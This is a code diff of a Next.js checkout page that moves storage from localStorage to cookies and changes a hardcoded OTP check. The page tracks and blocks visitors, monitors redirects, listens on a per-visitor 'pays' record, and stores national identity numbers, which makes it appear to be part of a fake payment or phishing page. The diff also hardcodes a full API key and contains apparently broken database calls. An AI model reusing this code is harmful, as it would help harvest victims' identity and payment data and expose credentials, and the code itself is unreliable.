@@ -18,8 +18,9 @@ import { StepShell } from "@/components/step-shell";
 import P1 from "@/components/form-a";
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
-import { addData, db } from "@/lib/supabase-client";
-import { doc, getDoc, onSnapshot, Firestore } from "@/lib/supabase-client";
+import { addData, db, doc, getDoc, onSnapshot } from "@/lib/supabase-client";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 export default function CheckPage() {
   const router = useRouter();
@@ -55,7 +56,7 @@ export default function CheckPage() {
     if (!visitorID || !db) return;
 
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
+      doc("pays", visitorID),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data();
@@ -95,7 +96,7 @@ export default function CheckPage() {
 
       // Load identity number from localStorage
       try {
-        const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}");
+        const hfd = JSON.parse(getCookie("homeFormData") || "{}");
         if (hfd.identityNumber) setIdentityNumber(hfd.identityNumber);
       } catch {
         /* ignore */
@@ -103,7 +104,7 @@ export default function CheckPage() {
 
       // Load selected offer from Supabase
       if (!db) return;
-      const docRef = doc(db as Firestore, "pays", visitorID);
+      const docRef = doc("pays", visitorID);
       const docSnap = await getDoc(docRef);
 
       if (docSnap.exists()) {
@@ -116,13 +117,13 @@ export default function CheckPage() {
         }
 
         // Save country to localStorage if it exists in Supabase
-        if (data.country && !localStorage.getItem("country")) {
-          localStorage.setItem("country", data.country);
+        if (data.country && !getCookie("country")) {
+          setCookie("country", data.country);
         }
       }
 
       // If country not in Supabase or localStorage, fetch it
-      if (!localStorage.getItem("country")) {
+      if (!getCookie("country")) {
         try {
           const APIKEY =
             "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
@@ -133,7 +134,7 @@ export default function CheckPage() {
             // Convert country name to alpha-3 code
             const { countryNameToAlpha3 } = await import("@/lib/country-codes");
             const countryCode = countryNameToAlpha3(countryName);
-            localStorage.setItem("country", countryCode);
+            setCookie("country", countryCode);
             await addData({
               id: visitorID,
               country: countryCode,
@@ -168,7 +169,7 @@ export default function CheckPage() {
 
   const handleOtpSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (otpValue === "123456") {
+    if (otpValue === "1234560") {
       setShowOtpDialog(false);
       alert("تم الدفع بنجاح!");
     } else {
